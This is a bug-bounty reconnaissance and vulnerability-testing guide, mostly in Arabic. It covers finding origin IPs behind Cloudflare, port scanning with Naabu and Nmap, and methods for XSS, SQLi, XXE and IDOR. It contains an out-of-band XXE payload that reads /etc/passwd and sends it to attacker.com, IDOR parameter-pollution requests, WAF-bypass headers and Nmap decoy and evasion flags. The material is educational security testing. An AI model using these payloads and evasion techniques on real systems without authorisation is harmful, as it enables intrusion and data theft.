Build your full attack surface before touching the target — as used in real Bug Bounty

💡 Edge Cases — ماذا تفعل لو؟

💡 What-If Scenarios & Edge Cases

❓ Scenario 1: كل النطاقات الفرعية خلف Cloudflare؟ (Behind Cloudflare CDN)

• الحل: ابحث عن الـ Origin IP الحقيقي للسيرفر لتخطي الحماية. استخدم أدوات مثل Shodan أو Censys للبحث عن الشهادة التاريخية، أو فحص سجلات DNS التاريخية (DNSTrails) لرصد IP السيرفر قبل تفعيل Cloudflare.

❓ Scenario 2: الـ Scope محدد بنطاق واحد فقط ولا يسمح بـ Wildcard؟ (Single Target Only)

• الحل: ركّز بالكامل على تخمين المجلدات والملفات (Directory Discovery)، فحص ثغرات المدخلات والمعاملات (Parameters Discovery)، وقراءة ملفات الـ JS بدقة للعثور على API endpoints داخل نفس النطاق.

❓ Scenario 3: البرنامج يمنع الفحص التلقائي تماماً؟ (No Automated Scans Allowed)

• الحل: اعتمد 100% على الـ OSINT السلبي والتصفح اليدوي عبر المتصفح مع تفعيل Burp Suite للاستماع فقط (Passive Interception). قم بتحليل طلبات التطبيق العادية دون إرسال طلبات فحص مكثفة.

🛡️ Ethical Boundaries & Risk Management — أخلاقيات وجودة الفحص

🛡️ Ethical Boundaries & DoS Prevention

لتجنب التسبب في هجمات حرمان الخدمة (DoS) غير المقصودة وتفادي حظر عنوان الـ IP الخاص بك من قبل جدران الحماية (WAF):

  • التحكم بالـ Rate Limiting: حدد عدد الطلبات في الثانية عند استخدام httpx أو ffuf (مثلاً استخدام علم -t 10 أو -rate-limit 15).
  • تجنب فحص ملفات ضخمة: لا تشغل فحصاً تلقائياً بمجلدات ضخمة جداً (wordlists تزيد عن 50 ألف سطر) على السيرفرات الضعيفة.
  • احترم ملف الـ robots.txt: اقرأه يدوياً قبل الفحص لتفادي الضغط على المسارات المستبعدة.

📊 Output Interpretation — تحليل وتفسير النتائج

📊 How to Read & Analyze httpx Output

بفرض أنك حصلت على المخرجات التالية من أداة httpx:

https://dev.target.com [200] [DevEnv - Internal] [PHP/8.1, nginx/1.18]
• [PHP/8.1]: إشارة فورية لوجود لغة PHP بإصدار 8.1. ابحث فوراً عن CVEs معروفة لهذا الإصدار (مثال: RCE ثغرة PHP 8.1.0-dev backdoor).
• [nginx/1.18]: ابحث عن أخطاء التكوين الشائعة في خوادم nginx مثل Nginx Alias Traversal أو استغلال الصلاحيات في ملف التكوين.
• ماذا لو حصلت على [403 Forbidden]؟ لا تترك النطاق! جرب تخطي جدار الحماية (WAF Bypass) عبر تغيير الـ Headers (مثل X-Forwarded-For: 127.0.0.1) أو استخدام مسارات بديلة مثل /admin/..;/.

Active Port Scanning

فحص المنافذ والخدمات المفتوحة باحترافية وتحديد الإصدارات

⏱️ 15-40 min Medium

⚡ Scanner Pipeline (Naabu -> Nmap)

أفضل طريقة حالياً في الـ Bug Bounty هي دمج السرعة مع الدقة. لا تستخدم Nmap لفحص 65,000 منفذ لأنه بطيء جداً.

الخطوة (Step) الأداة (Tool) السبب (Reason)
1. Fast Discovery Naabu / RustScan اكتشاف المنافذ المفتوحة فقط بسرعة صاروخية (خلال ثوانٍ).
2. Deep Probing Nmap أخذ المنافذ التي وجدتها Naabu وتمريرها لـ Nmap لفحص الإصدارات (Version Detection).
3. UDP Scanning Nmap UDP فحص أهم منافذ UDP (مثل 161 SNMP, 53 DNS) للبحث عن تسريبات.

🛠️ Port Scan Pro Commands

1. Naabu Fast Scan (All Ports)

naabu -list subdomains.txt -p - -c 50 -rate 3000 -silent -o open_ports.txt

2. Nmap Targeted Scan (Pass ports to Nmap)

nmap -sC -sV -p $(cat open_ports.txt | cut -d ':' -f 2 | tr '\n' ',' | sed 's/,$//') -iL subdomains.txt -Pn -oN nmap_detailed.txt

3. Nmap UDP Scan (Top 100 ports)

sudo nmap -sU --top-ports 100 -iL subdomains.txt -Pn -oN nmap_udp.txt

🚨 WAF Evasion (تخطي الحماية)

إذا كان الـ Target محمياً بـ Cloudflare أو Akamai، فإن فحص Nmap العادي سيؤدي إلى حظر الـ IP الخاص بك (Ban).

  • استخدم --mtu 24 لتقطيع الحزم (Fragmentation).
  • استخدم -D RND:10 لاستخدام Decoys مخادعة.
  • استخدم --randomize-hosts و --scan-delay 1s لتقليل وتيرة الفحص.

Cross-Site Scripting (XSS)

منهجية الفحص، تجاوز فلاتر الحماية (WAF)، واختراق سياق الـ DOM

⏱️ 1-3 Hours Hard

💡 XSS Hunting Strategy

لا تقم برمي الـ Payloads بشكل عشوائي! اتبع هذه المنهجية لاكتشاف ثغرات الـ XSS المخفية بدقة:

  • ✔ 1. Test Reflection: اكتب كلمة مميزة (مثل hxss99) ولاحظ أين تنعكس في الكود المصدر.
  • ✔ 2. Break Context: حاول كسر السياق (إذا كنت في Attribute، جرب ">).
  • ✔ 3. Bypass WAF: استخدم تشفير URL أو تعليقات HTML أو Event Handlers غير مألوفة.

SQL Injection (SQLi)

منهجية كشف واستغلال ثغرات قواعد البيانات يدوياً وتلقائياً

⏱️ 1-3 Hours Medium

💡 SQLi Detection Strategy

تحدث الثغرة عندما يتم دمج مدخلات المستخدم مباشرة مع استعلام قاعدة البيانات.

  • ✔ Error-Based Testing: احقن علامة الاقتباس ' أو " ولاحظ إن ظهر خطأ SQL Syntax Error.
  • ✔ Boolean-Based: جرب إضافة AND 1=1 ثم AND 1=2 وقارن بين طول الصفحة في الحالتين.
  • ✔ Time-Based: إذا كان الـ Input مخفياً، استخدم SLEEP(10) ولاحظ وقت تأخير استجابة السيرفر.

XML External Entity (XXE)

اختراق محللات الـ XML لقراءة ملفات النظام الحساسة أو إطلاق هجمات SSRF

⏱️ 1-3 Hours High

💡 Blind & OOB (Out-of-Band) XXE Strategy

في كثير من الأحيان، السيرفر يعالج ملف الـ XML لكنه **لا يظهر لك النتيجة** على الشاشة. الحل هو إجبار السيرفر على إرسال الملفات التي قرأها إلى خادم تملكه (OOB XXE).

# الحمولة الخبيثة (يتم رفعها أو إرسالها بالطلب): <?xml version="1.0" ?> <!DOCTYPE ANY [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; %send; ]> # محتوى ملف evil.dtd الموجود في سيرفر المهاجم (يقوم بإرسال الملف المقروء كمتغير بمسار URL): <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?leak=%file;'>"> %all;

🥷 Hidden XXE Surfaces (الأماكن الخفية للثغرة)

  • ✔ ملفات الأوفيس: هل الموقع يسمح برفع ملفات .docx أو .xlsx؟ قم بفك ضغط الملف، وعدل ملف [Content_Types].xml، واحفظه مجدداً للقيام بـ XXE مخفي.
  • ✔ تعديل الـ Content-Type: إذا كان الـ API يستقبل JSON {"name":"abdo"}، جرب تغييره في Burp إلى application/xml وأرسل بياناتك كـ XML.
  • ✔ ملفات الصور (SVG): الصور بصيغة SVG مبنية بالأساس على XML، ويمكن وضع حمولات XXE داخلها لسرقة الملفات عند محاولة عرضها أو معالجتها.

IDOR (Insecure Direct Object Reference)

تخطي الصلاحيات الأفقية والعمودية والتلاعب بالـ Parameters

⏱️ 1-3 Hours Medium

💡 Testing Strategy (كيف تصطادها؟)

لاكتشاف هذه الثغرة، يجب أن يكون لديك حسابين مختلفين (A و B) ضمن التارجت.

  • ✔ 1. Capture the Request: استخدم Burp Suite لالتقاط طلب لملف خاص بحساب A (مثال: الفاتورة رقم 100).
  • ✔ 2. Modify the ID: غير رقم الفاتورة إلى 101 (الخاص بحساب B).
  • ✔ 3. Check the Response: إذا تم تحميل فاتورة حساب B دون التحقق من صلاحيتك، فقد عثرت على IDOR!
"أداة Autorize في Burp Suite تقوم بهذه المهمة أوتوماتيكياً عبر تمرير كوكيز حساب B مع طلبات حساب A وتلوين الطلبات الناجحة بالأخضر."

🥷 Parameter Pollution (تكتيكات متقدمة)

إذا كان الـ Backend يقوم بمقارنة الـ ID الخاص بك ورفض الطلب، قم بمحاولة التلاعب ببرمجة السيرفر:

# 1. HPP (HTTP Parameter Pollution) GET /api/profile?id=MY_ID&id=VICTIM_ID # 2. JSON Array Wrap {"user_id": [MY_ID, VICTIM_ID]} # 3. Add Extension GET /api/profile/VICTIM_ID.json
